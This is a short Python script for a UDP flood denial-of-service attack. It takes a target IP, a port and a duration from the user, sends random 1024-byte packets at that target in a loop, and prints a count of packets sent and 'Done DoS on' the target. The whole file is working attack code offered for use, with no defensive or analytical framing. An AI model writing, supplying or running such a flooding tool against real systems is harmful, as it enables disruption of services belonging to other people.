import os
import sys
import time
import random
import colorama
import socket
from colorama import Fore
colorama.init()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system('cls')
target = input("Enter the target's IP: ")
port = int(input("Enter port: "))
dur = int(input("Enter duration: "))
timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (target, port))
        sent += 1
        print(Fore.LIGHTMAGENTA_EX + f"[{sent}]" + Fore.RED + f" Packets sent to {target} using port {port} through UDP.")
    except KeyboardInterrupt:
        sys.exit()

print(Fore.LIGHTBLUE_EX + f"Done DoS on " + Fore.LIGHTRED_EX + target)
input()